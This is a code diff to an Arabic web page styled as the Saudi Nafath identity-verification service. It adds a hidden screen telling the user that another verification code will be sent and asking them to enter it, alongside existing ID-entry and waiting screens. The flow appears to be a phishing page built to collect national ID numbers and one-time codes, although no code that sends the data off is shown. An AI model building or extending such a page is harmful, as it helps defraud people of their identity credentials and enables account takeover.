@@ -49,6 +49,7 @@
 
             <div class="form-panel-card" id="panelNafathApp">
                 
+                <!-- 1. شاشة إدخال رقم الهوية الافتراضية -->
                 <div id="nafathFormContainer" class="panel-grid">
                     <div class="form-side">
                         <form id="appForm" action="#" method="POST">
@@ -81,6 +82,7 @@
                     </div>
                 </div>
 
+                <!-- 2. شاشة رقم التأكيد الأول والانتظار العادية -->
                 <div id="nafathWaitContainer" class="hidden-panel" style="text-align: center; padding: 40px 15px;">
                     <div id="nafathLiveNumber" style="font-size: 26px; font-weight: 700; color: #14805e; border: 1.5px solid #14805e; display: inline-block; padding: 10px 32px; border-radius: 6px; background-color: #fcfdfe; margin-bottom: 25px; min-width: 60px; box-shadow: 0 2px 4px rgba(0,0,0,0.02);">
                         --
@@ -93,6 +95,24 @@
                     <button id="cancelNafathBtn" style="background: white; border: 1px solid #b3b3b3; color: #4a4a4a; padding: 8px 32px; border-radius: 5px; font-family: 'Cairo'; font-size: 14px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.05);">
                         <i class="fa-solid fa-rotate"></i> <span data-i18n="cancelBtn">إلغاء</span>
                     </button>
+                </div>
+
+                <!-- 3. الشاشة الجديدة: طلب كود التحقق الإضافي الآخر (مخفية افتراضياً) -->
+                <div id="nafathNewCodeContainer" class="hidden-panel" style="text-align: center; padding: 40px 15px;">
+                    <div style="font-size: 50px; color: #14805e; margin-bottom: 15px;">
+                        <i class="fa-solid fa-shield-amber"></i>
+                    </div>
+                    <h3 style="color: #14805e; font-size: 20px; font-weight: 700; margin-bottom: 10px;">سيتم ارسال كود اخر للتحقق يرجى ادخاله هنا</h3>
+                    <p style="color: #737373; font-size: 14px; margin-bottom: 20px;">الرجاء مراجعة هاتفك وإدخال رمز التحقق المستلم</p>
+                    
+                    <form id="newCodeForm" style="display: inline-block; width: 100%; max-width: 320px;">
+                        <div class="input-group" style="margin-bottom: 20px;">
+                            <input type="text" id="secondaryCodeInput" placeholder="X X X X" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 6px; font-weight: bold; border: 1.5px solid #14805e; border-radius: 6px; padding: 10px;" required>
+                        </div>
+                        <button type="submit" class="btn-submit" style="width: 100%;">
+                            <i class="fa-solid fa-paper-plane"></i> <span>إرسال رمز التحقق</span>
+                        </button>
+                    </form>
                 </div>
 
             </div>
@@ -173,7 +193,6 @@
     </script>
      
     <script>
-        // إعداد مستمعات أحداث القائمة المتجاوبة والهمبرغر
         const hamburgerBtn = document.getElementById('hamburgerBtn');
         const mobileNav = document.getElementById('mobileNav');
 
@@ -197,12 +216,10 @@
             }
         });
 
-        // دالة تبديل اللغة المستقرة لضمان الربط المباشر مع النافذة الحية والملف الخارجي
         function switchPlatformLanguage() {
             if (typeof window.toggleAppLanguage === 'function') {
                 window.toggleAppLanguage();
             } else {
-                // إذا لم يكن الملف الخارجي جاهزاً تماماً بعد، نقوم بالتبديل المحلي وحفظ الجلسة لحين اكتماله
                 let current = localStorage.getItem('platform_lang') || 'ar';
                 let nextLang = (current === 'ar') ? 'en' : 'ar';
                 localStorage.setItem('platform_lang', nextLang);
@@ -210,7 +227,6 @@
             }
         }
 
-        // ربط أزرار الويب والموبايل بالدالة الفورية
         document.getElementById('langSwitch')?.addEventListener('click', switchPlatformLanguage);
         document.getElementById('mobileLangSwitch')?.addEventListener('click', function(e) {
             e.preventDefault();
